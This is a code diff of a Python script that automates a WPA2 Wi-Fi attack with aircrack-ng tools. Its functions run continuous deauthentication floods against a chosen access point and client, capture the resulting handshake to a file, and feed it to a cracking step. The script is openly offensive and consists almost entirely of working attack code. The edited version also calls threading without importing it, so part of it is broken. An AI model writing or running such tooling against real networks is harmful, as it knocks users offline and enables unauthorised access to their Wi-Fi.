@@ -1,56 +1,4 @@
-import subprocess, signal, sys, time, os, shutil, csv, glob
-
-import subprocess
-
-def deauth(ap_mac, c_mac, interface):
-    # Construct the command with the provided parameters
-    command = [
-        'sudo', 'aireplay-ng',
-        '-0', '0',  # Number of deauth packets to send, 0 means send them continuously
-        '-a', ap_mac,  # Access Point MAC address
-        '-c', c_mac,  # Client MAC address
-        interface  # Network interface to use
-    ]
-
-    # Run the command in the background
-    try:
-        subprocess.Popen(command)
-        print(f"Deauth attack launched against AP MAC: {ap_mac} and client MAC: {c_mac} using interface: {interface}")
-    except Exception as e:
-        print(f"An error occurred when trying to launch deauth attack: {e}")
-
-def dump(ap_mac, channel):
-    try:
-        # Ensure the output directory exists
-        output_directory = "/mnt/data/wpa2_handshake"
-        os.makedirs(output_directory, exist_ok=True)
-        file_prefix = f"{output_directory}/airodump"
-
-        # Construct the command with the provided parameters
-        command = [
-            'airodump-ng',
-            '-c', channel,
-            '--bssid', ap_mac,
-            'wlan0mon',
-            '--write', file_prefix,
-            '--output-format', 'cap'
-        ]
-        print("Running airodump-ng... Press Ctrl+C to stop.")
-
-        # Execute the airodump-ng command
-        airodump_process = subprocess.Popen(command)
-        
-        try:
-            airodump_process.wait()
-        except KeyboardInterrupt:
-            airodump_process.terminate()
-            print("\nAirodump-ng stopped by user.")
-
-    except Exception as e:
-        print(f"An error occurred: {e}")
-    
-    finally:
-        print("Capture file saved.")
+import subprocess, signal, sys, time, os, shutil, csv, glob, time
 
 def crack():
     cap_file = "/mnt/data/wpa2_handshake/airodump-01.cap"
@@ -221,20 +169,38 @@ def target_c(bssid):
     client_mac = run_airodump(bssid)
     return client_mac
 
-def signal_handler(sig, frame):
-    sys.exit(0)
+def deauth(ap_mac, c_mac, interface):
+    try:
+        while True:  # Loop to run the command repeatedly
+            # Run the deauth command with updated arguments
+            process = subprocess.Popen(["aireplay-ng", "-0", "5", "-a", ap_mac, "-c", c_mac, interface],
+                                       stdout=subprocess.DEVNULL,  # Silencing output
+                                       stderr=subprocess.STDOUT)
+            time.sleep(5)  # Wait for 5 seconds before running the command again
+    except Exception as e:
+        print(f"Deauth command encountered an error: {e}")
 
-def main(essid, ap_mac, your_mac, c_mac):
+def dump(channel, bssid, interface):
+    try:
+        subprocess.run(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", "/mnt/data/wpa2/wpa2handshake", interface], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Dump command failed: {e}")
+
+def main(essid, ap_mac, c_mac):
     channel = "6"
     interface = "wlan0mon"
 
-    # Set up signal handling to catch Ctrl+C and perform cleanup
+    def signal_handler(sig, frame):
+        print('Stopping...')
+        os._exit(0)  # Exit immediately, ensuring subprocesses are terminated
+
     signal.signal(signal.SIGINT, signal_handler)
 
-    try:
-        deauth(ap_mac, c_mac, interface)
-        dump(ap_mac, channel)
-    except KeyboardInterrupt:
-        print('Ctrl+C Was Pressed...')
-    except Exception as e:
-        print(f"An error occurred: {e}")
+    deauth_thread = threading.Thread(target=deauth, args=(ap_mac, c_mac, interface), daemon=True)
+    deauth_thread.start()
+
+    print("Running deauth in the background...")
+
+    # Run dump command, visible output to the user
+    print("Starting dump...")
+    dump(channel, ap_mac, interface)
